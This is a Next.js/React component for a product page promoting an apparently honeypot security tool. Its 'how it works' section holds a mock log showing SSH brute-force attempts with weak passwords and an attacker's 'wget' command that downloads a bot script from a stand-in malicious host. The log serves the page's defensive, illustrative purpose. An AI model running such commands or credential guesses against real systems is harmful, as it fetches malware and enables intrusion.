'use client';

import { useTranslations } from 'next-intl';
import FadeInUp from '@/components/FadeInUp';
import SectionWrapper from '@/components/ui/SectionWrapper';
import SectionTitle from '@/components/ui/SectionTitle';
import { Link } from '@/navigation';
import { ArrowRight } from 'lucide-react';
import {
  NetworkIcon,
  ScanIcon,
  GlobalIcon,
  SettingsIcon,
  ShieldIcon,
  TerminalIcon,
  TeamIcon,
  EnterpriseIcon,
} from '@/components/ui/BrandIcons';

/* ─── Icon maps ─── */
const featureIcons = [NetworkIcon, ScanIcon, GlobalIcon, SettingsIcon, NetworkIcon, ShieldIcon];
const featureKeys = ['item1', 'item2', 'item3', 'item4', 'item5', 'item6'] as const;

const useCaseIcons = [TerminalIcon, TeamIcon, EnterpriseIcon];
const useCaseKeys = ['item1', 'item2', 'item3'] as const;

const stepKeys = ['step1', 'step2', 'step3', 'step4', 'step5'] as const;

export default function ProductTrapContent() {
  const t = useTranslations('product.trap');

  return (
    <>
      {/* ── Hero ── */}
      <section className="relative min-h-[50vh] flex items-center px-6 lg:px-[120px] py-24 border-b border-border overflow-hidden">
        <div className="absolute top-1/3 left-1/2 -translate-x-1/2 w-[700px] h-[400px] bg-brand-sage/5 rounded-full blur-[200px] pointer-events-none" />
        <div className="max-w-[1200px] mx-auto relative text-center w-full">
          <FadeInUp>
            <div className="relative w-20 h-20 mx-auto mb-4 flex items-center justify-center">
              <div className="absolute inset-0 rounded-full border border-brand-sage/20 animate-[spin_12s_linear_infinite]" />
              <div className="absolute inset-2 rounded-full border border-brand-sage/10 animate-[spin_8s_linear_infinite_reverse]" />
              <NetworkIcon className="w-10 h-10 text-brand-sage relative" />
            </div>
          </FadeInUp>
          <FadeInUp delay={0.05}>
            <p className="text-[11px] uppercase tracking-[0.15em] text-brand-sage font-semibold mb-4">
              {t('overline')}
            </p>
            <h1 className="text-[clamp(36px,4.5vw,56px)] font-extrabold leading-[1.08] tracking-tight text-text-primary max-w-3xl mx-auto">
              {t('title')} <span className="text-brand-sage">{t('titleHighlight')}</span>
            </h1>
          </FadeInUp>
          <FadeInUp delay={0.1}>
            <p className="text-xl text-text-secondary max-w-xl mx-auto mt-6 leading-relaxed">
              {t('subtitle')}
            </p>
          </FadeInUp>
        </div>
      </section>

      {/* ── Pain Point ── */}
      <SectionWrapper>
        <div className="max-w-3xl mx-auto">
          <FadeInUp>
            <p className="text-[11px] uppercase tracking-[0.12em] text-brand-sage font-semibold mb-4">
              {t('problem.overline')}
            </p>
            <h2 className="text-[clamp(28px,3vw,40px)] font-bold text-text-primary leading-[1.1]">
              {t('problem.title')}
            </h2>
          </FadeInUp>
          <FadeInUp delay={0.1}>
            <p className="text-text-secondary mt-5 leading-relaxed">{t('problem.desc')}</p>
            <p className="text-text-secondary mt-4 leading-relaxed">{t('problem.desc2')}</p>
          </FadeInUp>
        </div>
      </SectionWrapper>

      {/* ── How It Works Mockup ── */}
      <SectionWrapper dark>
        <div className="grid lg:grid-cols-2 gap-12 items-center">
          <div>
            <FadeInUp>
              <p className="text-[11px] uppercase tracking-[0.12em] text-brand-sage font-semibold mb-4">
                {t('howItWorks.overline')}
              </p>
              <h2 className="text-[clamp(28px,3vw,40px)] font-bold text-text-primary leading-[1.1]">
                {t('howItWorks.title')}
              </h2>
            </FadeInUp>
            <FadeInUp delay={0.1}>
              <div className="space-y-4 mt-6">
                {stepKeys.map((key, i) => (
                  <div key={key} className="flex gap-4 items-start">
                    <span className="text-xs font-bold text-brand-sage font-mono shrink-0 w-6">
                      {String(i + 1).padStart(2, '0')}
                    </span>
                    <div>
                      <p className="text-sm font-semibold text-text-primary">
                        {t(`howItWorks.${key}.label`)}
                      </p>
                      <p className="text-xs text-text-tertiary mt-0.5">
                        {t(`howItWorks.${key}.desc`)}
                      </p>
                    </div>
                  </div>
                ))}
              </div>
            </FadeInUp>
          </div>
          <FadeInUp delay={0.15}>
            <div className="bg-surface-2 rounded-xl border border-border overflow-hidden">
              <div className="bg-surface-3 px-4 py-3 border-b border-border">
                <span className="text-sm font-semibold text-text-primary">
                  {t('howItWorks.logTitle')}
                </span>
              </div>
              <div className="p-4 font-mono text-xs space-y-2">
                {[
                  {
                    time: '03:12:41',
                    text: 'Honeypot SSH (port 2222) connection from 185.220.xx.xx',
                    color: 'text-[#f59e0b]',
                  },
                  {
                    time: '03:12:43',
                    text: 'Brute-force attempt: root/admin123',
                    color: 'text-[#ef4444]',
                  },
                  {
                    time: '03:12:44',
                    text: 'Brute-force attempt: root/password',
                    color: 'text-[#ef4444]',
                  },
                  {
                    time: '03:12:47',
                    text: 'Login succeeded (honeypot credentials)',
                    color: 'text-[#f59e0b]',
                  },
                  { time: '03:12:49', text: 'Command: uname -a', color: 'text-text-secondary' },
                  {
                    time: '03:12:51',
                    text: 'Command: wget http://malicious.xx/bot.sh',
                    color: 'text-[#ef4444]',
                  },
                  {
                    time: '03:12:52',
                    text: 'File captured: bot.sh (SHA256: 8a3f...)',
                    color: 'text-[#22c55e]',
                  },
                  {
                    time: '03:12:55',
                    text: 'Attacker profile: automated scanner, low sophistication',
                    color: 'text-brand-sage',
                  },
                  {
                    time: '03:12:56',
                    text: 'IOC submitted to collective intelligence',
                    color: 'text-brand-sage',
                  },
                ].map((line, i) => (
                  <div key={i} className="flex gap-3">
                    <span className="text-text-muted shrink-0">{line.time}</span>
                    <span className={line.color}>{line.text}</span>
                  </div>
                ))}
              </div>
            </div>
          </FadeInUp>
        </div>
      </SectionWrapper>

      {/* ── Features ── */}
      <SectionWrapper>
        <SectionTitle
          overline={t('features.overline')}
          title={t('features.title')}
          subtitle={t('features.subtitle')}
        />
        <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-4 mt-14">
          {featureKeys.map((key, i) => {
            const Icon = featureIcons[i];
            return (
              <FadeInUp key={key} delay={i * 0.08}>
                <div className="bg-surface-1 rounded-xl border border-border p-6 h-full card-glow">
                  <Icon className="w-5 h-5 text-brand-sage mb-4" />
                  <p className="text-sm font-bold text-text-primary mb-2">
                    {t(`featuresList.${key}.title`)}
                  </p>
                  <p className="text-xs text-text-secondary leading-relaxed">
                    {t(`featuresList.${key}.desc`)}
                  </p>
                </div>
              </FadeInUp>
            );
          })}
        </div>
      </SectionWrapper>

      {/* ── Use Cases ── */}
      <SectionWrapper dark>
        <SectionTitle overline={t('useCases.overline')} title={t('useCases.title')} />
        <div className="grid sm:grid-cols-3 gap-6 mt-14">
          {useCaseKeys.map((key, i) => {
            const Icon = useCaseIcons[i];
            return (
              <FadeInUp key={key} delay={i * 0.1}>
                <div className="bg-surface-2 rounded-xl border border-border p-6 h-full card-glow">
                  <Icon className="w-6 h-6 text-brand-sage mb-4" />
                  <p className="text-sm font-bold text-text-primary mb-2">
                    {t(`useCases.${key}.title`)}
                  </p>
                  <p className="text-xs text-text-secondary leading-relaxed">
                    {t(`useCases.${key}.desc`)}
                  </p>
                </div>
              </FadeInUp>
            );
          })}
        </div>
      </SectionWrapper>

      {/* ── CTA ── */}
      <SectionWrapper>
        <div className="text-center">
          <FadeInUp>
            <h2 className="text-[clamp(28px,3vw,40px)] font-bold text-text-primary">
              {t('cta.title')}
            </h2>
            <p className="text-text-secondary mt-3 max-w-lg mx-auto">{t('cta.desc')}</p>
          </FadeInUp>
          <FadeInUp delay={0.1}>
            <div className="flex flex-wrap justify-center gap-3 mt-8">
              <Link
                href="/early-access"
                className="inline-flex items-center gap-2 bg-brand-sage text-surface-0 font-semibold rounded-full px-8 py-3.5 hover:bg-brand-sage-light transition-all duration-200 active:scale-[0.98]"
              >
                {t('cta.cta1')} <ArrowRight className="w-4 h-4" />
              </Link>
              <Link
                href="/product/guard"
                className="border border-border text-text-secondary hover:text-text-primary hover:border-brand-sage font-semibold rounded-full px-8 py-3.5 transition-all duration-200"
              >
                {t('cta.cta2')}
              </Link>
            </div>
          </FadeInUp>
        </div>
      </SectionWrapper>
    </>
  );
}
